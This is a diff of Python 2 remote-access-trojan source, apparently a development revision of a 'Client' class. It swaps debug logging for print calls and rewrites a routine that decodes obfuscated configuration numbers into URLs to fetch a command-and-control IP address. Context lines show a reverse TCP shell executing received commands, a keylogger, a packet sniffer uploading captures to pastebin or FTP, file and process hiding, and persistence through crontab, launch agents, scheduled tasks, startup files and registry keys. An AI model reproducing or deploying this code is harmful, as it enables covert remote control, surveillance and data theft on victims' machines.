@@ -164,7 +164,7 @@ class Client():
         dat = urllib.urlencode(data)
         req = urllib2.Request(url, data=dat) if data else urllib2.Request(url)
         for key, value in headers.items():
-            req.add_header(key, value)
+            req.headers[key] = value
         return urllib2.urlopen(req).read()
 
 
@@ -184,22 +184,7 @@ class Client():
         try:
             return urllib.urlopen(bytes(bytearray.fromhex(hex(long('120950513014781697487772252820504293289885893009420441905241{}'.format(x))).strip('0x').strip('L')))).read()
         except Exception as e:
-            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))
-
-
-    @staticmethod
-    def _get_address(a, b):
-        try:
-            ab  = json.loads(Client._post(a, headers={'API-Key': b}))
-            ip  = ab[ab.keys()[0]][0].get('ip')
-            if Client._get_ipv4_address(ip):
-                return ip
-            else:
-                Client._debug("Invalid IPv4 address ('{}')\nRetrying in 5...".format(ip))
-        except Exception as e:
-            Client._debug("{} returned error: {}".format(Client._get_address.func_name, str(e)))
-        time.sleep(5)
-        return Client._get_address(a, b)        
+            Client._debug("{} returned error: {}".format(Client._get_config.func_name, str(e)))      
 
     @staticmethod
     def _get_connection(x, y):
@@ -318,7 +303,30 @@ class Client():
         except (socket.error, socket.timeout):
             pass
         except Exception as e:
-            self._debug('{} error: {}'.format(self._get_port.func_name.title(), str(e)))
+            print('{} error: {}'.format(self._get_port.func_name.title(), str(e)))
+
+
+    @classmethod
+    def _get_address(self):
+        try:
+            a = self._get_config(long(self.__a__))
+            b = self._get_config(long(self.__b__))
+            c = urllib2.Request(a)
+            c.headers = {'API-Key': b}
+            x = urllib2.urlopen(c).read()
+            print(x)
+            d = json.loads(x)
+            e = d[d.keys()[0]][0].get('ip')
+            print(e)
+            if self._get_ipv4_address(e):
+                print(e)
+                return e
+            else:
+                print("Invalid IPv4 address ('{}')\nRetrying in 5...".format(e))
+        except Exception as e:
+            print("{} returned error: {}".format(self._get_address.func_name, str(e)))
+        time.sleep(5)
+        return self._get_address() 
 
 
     @classmethod
@@ -351,7 +359,7 @@ class Client():
                 self.keylogger.buffer.reset()
                 
         except Exception as e:
-            self._debug('{} error: {}'.format(self._get_event.title(), str(e)))
+            print('{} error: {}'.format(self._get_event.title(), str(e)))
         return True
 
 
@@ -533,7 +541,7 @@ class Client():
                         self._jobs['scanner-%d' % x].join()
                 return json.dumps(self.network)
         except Exception as e:
-            self._debug('{} error: {}'.format(self.scan_ports.func_name.title(), str(e)))
+            print('{} error: {}'.format(self.scan_ports.func_name.title(), str(e)))
 
 
     @config(platforms=['win32','linux2','darwin']) 
@@ -559,7 +567,7 @@ class Client():
             self._jobs['scanner-%d' % x].join()
             return json.dumps(self._network)
         except Exception as e:
-            self._debug('{} error: {}'.format(self.scan_network.func_name.title(), str(e)))
+            print('{} error: {}'.format(self.scan_network.func_name.title(), str(e)))
 
 
     @config(platforms=['win32','linux2','darwin'])
@@ -621,7 +629,7 @@ class Client():
                     sock.sendall(struct.pack("L", len(data))+data)
                     time.sleep(0.1)
                 except Exception as e:
-                    self._debug('Stream error: {}'.format(str(e)))
+                    print('Stream error: {}'.format(str(e)))
                     break
         finally:
             try:
@@ -651,7 +659,7 @@ class Client():
                             self.__f__ = bytes(bytes_to_long(self._upload_pastebin(path)))[-21:]
                         return (True, path)
                 except Exception as e:
-                    self._debug('Adding hidden file error: {}'.format(str(e)))
+                    print('Adding hidden file error: {}'.format(str(e)))
         return (False, None)
 
 
@@ -668,7 +676,7 @@ class Client():
                     if subprocess.call(unhide, 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0:
                         return True
                 except Exception as e:
-                    self._debug('Error unhiding file: {}'.format(str(e)))
+                    print('Error unhiding file: {}'.format(str(e)))
         return False 
 
 
@@ -697,14 +705,14 @@ class Client():
                                         fd.write('\n' + task + '\n')
                                 return (True, name)
                             except Exception as e:
-                                self._debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
+                                print("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                                 try:
                                     os.remove(name)
                                 except: pass
                     else:
                         return (True, name)
                 except Exception as e:
-                    self._debug("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
+                    print("{} returned error: {}".format(self._persistence_add_crontab_job.func_name, str(e)))
                     try:
                         os.remove(name)
                     except: pass
@@ -729,7 +737,7 @@ class Client():
                         fp.write('\n'.join(lines))
                     return True
                 except Exception as e:
-                    self._debug(str(e))
+                    print(str(e))
         return False
 
 
@@ -757,7 +765,7 @@ class Client():
                         os.remove(fpath)
                         return (True, launch_agent)
                 except Exception as e2:
-                    self._debug('Error: {}'.format(str(e2)))
+                    print('Error: {}'.format(str(e2)))
         return (False, None)
 
 
@@ -793,7 +801,7 @@ class Client():
                     if 'SUCCESS' in result:
                         return (True, result)
                 except Exception as e:
-                    self._debug('Add scheduled task error: {}'.format(str(e)))
+                    print('Add scheduled task error: {}'.format(str(e)))
         return (False, None)
 
 
@@ -826,7 +834,7 @@ class Client():
                             fp.write(content)
                     return (True, startup_file)
                 except Exception as e:
-                    self._debug('{} returned error: {}'.format(self._persistence_add_startup_file.func_name.strip('_'), str(e)))
+                    print('{} returned error: {}'.format(self._persistence_add_startup_file.func_name.strip('_'), str(e)))
         return (False, None)
 
 
@@ -865,7 +873,7 @@ class Client():
                     CloseKey(reg_key)
                     return (True, name)
                 except Exception as e:
-                    self._debug('{} returned error: {}'.format(self._persistence_add_registry_key.func_name.strip('_'), str(e)))
+                    print('{} returned error: {}'.format(self._persistence_add_registry_key.func_name.strip('_'), str(e)))
         return (False, None)
     
 
@@ -1183,7 +1191,7 @@ class Client():
                 output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
                 result = self._upload_pastebin(output) if 'ftp' not in args else self._upload_ftp(output)
             except Exception as e:
-                self._debug("packetsniffer manager returned error: {}".format(str(e)))
+                print("packetsniffer manager returned error: {}".format(str(e)))
         try:
             if self.packetsniffer.func_name in self._jobs:
                 return "packetsniffer running for {}".format(self._get_status(self._jobs[self.packetsniffer.func_name].name))
@@ -1330,12 +1338,12 @@ class Client():
             self._session['key']    = None
             self._session['id']     = None
         except Exception as e1:
-            self._debug("{} returned error: {}".format(self.kill.func_name, str(e1)))
+            print("{} returned error: {}".format(self.kill.func_name, str(e1)))
 
         try:
             self._session['connection'].clear()
         except Exception as e2:
-            self._debug("{} returned error: {}".format(self.kill.func_name, str(e2)))
+            print("{} returned error: {}".format(self.kill.func_name, str(e2)))
 
         for t in [i for i in self._jobs]:
             try:
@@ -1480,7 +1488,7 @@ class Client():
                 else:
                     time.sleep(0.1)
             except Exception as e:
-                self._debug('{} error: {}'.format(self.keylogger.title(), str(e)))
+                print('{} error: {}'.format(self.keylogger.title(), str(e)))
                 break
 
 
@@ -1556,7 +1564,7 @@ class Client():
                     try:
                         remove = getattr(self, '_persistence_remove_{}'.format(method))()
                     except Exception as e2:
-                        self._debug("Error removing persistence method '{}': {}".format(method, str(e2)))
+                        print("Error removing persistence method '{}': {}".format(method, str(e2)))
             
             try:
                 os.remove(__file__)
@@ -1580,7 +1588,7 @@ class Client():
             p = subprocess.Popen(path, startupinfo=info, shell=shell)
             return p
         except Exception as e:
-            self._debug("Hidden process error: {}".format(str(e)))
+            print("Hidden process error: {}".format(str(e)))
             
 
     def send_data(self, **kwargs):
@@ -1602,7 +1610,7 @@ class Client():
                 data = self.decrypt(data.rstrip())
             return json.loads(data)
         except Exception as e:
-            self._debug('{} error: {}'.format(self.recv_data.func_name.strip('_').title(), str(e)))
+            print('{} error: {}'.format(self.recv_data.func_name.strip('_').title(), str(e)))
 
         
     def diffiehellman(self):
@@ -1620,7 +1628,7 @@ class Client():
             y  = SHA256.new(long_to_bytes(x)).hexdigest()
             return self.obfuscate(y)
         except Exception as e:
-            self._debug("Diffie-Hellman transactionless key-agreement failed with error: {}\nrestarting in 5 seconds...".format(str(e)))
+            print("Diffie-Hellman transactionless key-agreement failed with error: {}\nrestarting in 5 seconds...".format(str(e)))
             time.sleep(5)
             return self.run()
 
@@ -1631,23 +1639,26 @@ class Client():
         """
         self.kill()
         try:
-            self._session['socket'] = self._get_connection('localhost', int(port)) if hasattr(self, '__v__') else self._get_connection(self._get_address(urllib.urlopen(self._get_config(long(self.__a__))).read(), self._get_config(long(self.__b__))), int(port))
+            if hasattr(self, '__v__'):
+                self._session['socket'] = self._get_connection('localhost', int(port))
+            else:
+                self._session['socket'] = self._get_connection(self._get_address(), int(port))
             self._session['connection'].set()
-            self._debug('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))
+            print('\nConnected to {}:{}\n'.format(*self._session['socket'].getpeername()))
 
             self._session['key'] = self.diffiehellman()
-            self._debug('Session Key: {}\n'.format(self._session['key']))
+            print('Session Key: {}\n'.format(self._session['key']))
 
             self._session['socket'].sendall(self.encrypt(json.dumps(self._info)) + '\n')
-            self._debug(json.dumps(self._info, indent=2) + '\n')
+            print(json.dumps(self._info, indent=2) + '\n')
 
             buf = ''
             while '\n' not in buf:
                 buf += self._session['socket'].recv(1024)
             self._session['id'] = self.decrypt(buf.rstrip())
-            self._debug('Client ID: {}\n'.format(self._session['id']))
+            print('Client ID: {}\n'.format(self._session['id']))
         except Exception as e:
-            self._debug("{} returned error: {}\nrestarting in 5 seconds...".format(self.new_session.func_name, str(e)))
+            print("{} returned error: {}\nrestarting in 5 seconds...".format(self.new_session.func_name, str(e)))
             time.sleep(5)
             return self.run()
 
@@ -1666,7 +1677,7 @@ class Client():
                     
                     self.send_data(**prompt)
 
-                    self._debug("Sent prompt:\n{}".format(json.dumps(prompt, indent=2)))
+                    print("Sent prompt:\n{}".format(json.dumps(prompt, indent=2)))
 
                     task   = self.recv_data()
 
@@ -1676,11 +1687,11 @@ class Client():
 
                         command, _, action  = bytes(task['command']).partition(' ')
 
-                        self._debug("\ntask: {}\nclient: {}\ncommand: {}\n".format(task['id'], task['client'], task['command']))
+                        print("\ntask: {}\nclient: {}\ncommand: {}\n".format(task['id'], task['client'], task['command']))
                         
                         if command in self._commands:
 
-                            self._debug("Running client command '{}'".format(self._commands[command]['method'].func_name))
+                            print("Running client command '{}'".format(self._commands[command]['method'].func_name))
                             
                             try:
                                 result  = bytes(self._commands[command]['method'](action)) if len(action) else bytes(self._commands[command]['method']())
@@ -1688,7 +1699,7 @@ class Client():
                                 result  = "Error: %s" % bytes(e1)
                         else:
 
-                            self._debug("Running shell command '{}'".format(command))
+                            print("Running shell command '{}'".format(command))
                             
                             try:
                                 result  = bytes().join(subprocess.Popen(command, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
@@ -1699,7 +1710,7 @@ class Client():
 
                         task.update({"data": result})
 
-                        self._debug("Sending task results:\n{}".format(json.dumps(task, indent=2)))
+                        print("Sending task results:\n{}".format(json.dumps(task, indent=2)))
                     
                         self.send_data(**task)
                            
@@ -1711,12 +1722,12 @@ class Client():
                     time.sleep(0.5)
 
                 else:
-                    self._debug("Client was disconnected - Restarting in 5 seconds...")
+                    print("Client was disconnected - Restarting in 5 seconds...")
                     time.sleep(5)
                     break  
                 
             except Exception as e3:
-                self._debug("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
+                print("{} returned error: {}\nRestarting in 5 seconds...".format(self.reverse_tcp_shell.func_name, str(e3)))
                 time.sleep(5)
                 break
         self.kill()
@@ -1798,7 +1809,6 @@ if __name__ == '__main__':
   "s": "81399447134546511973",
   "u": "76299683425183950643", 
   "t": "79310384705633414777",
-  "v": "00000000000000000000",
   "w": "77888090548015223857",
   "z": "79892739118577505130"
 })
